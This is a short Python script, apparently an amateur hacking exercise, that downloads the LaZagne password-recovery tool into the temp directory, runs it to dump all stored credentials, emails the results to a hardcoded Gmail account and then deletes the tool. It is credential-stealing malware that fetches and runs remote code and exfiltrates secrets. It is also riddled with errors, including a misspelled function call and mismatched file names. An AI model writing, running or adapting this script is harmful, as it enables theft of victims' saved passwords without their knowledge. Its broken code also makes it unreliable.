#!usr/bin/evn python

import requests, smtplib, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name,'wb') as out_file:
        out_file.write(get_response.content)

def send_mail(email,password,massage):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,massage)
    server.quit()


temp_dir = tempfile.gettempdir() # this will return the temp Directory.
os.chdir(temp_dir)               # this will chenge the Directory to /temp
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

command = "lazagne1.exe all"
result = subprocess.check_output(command, shell=True)
send_male(" wejhoon@gmail.com","HackerEmail",result)
os.remove("laZagne.exe")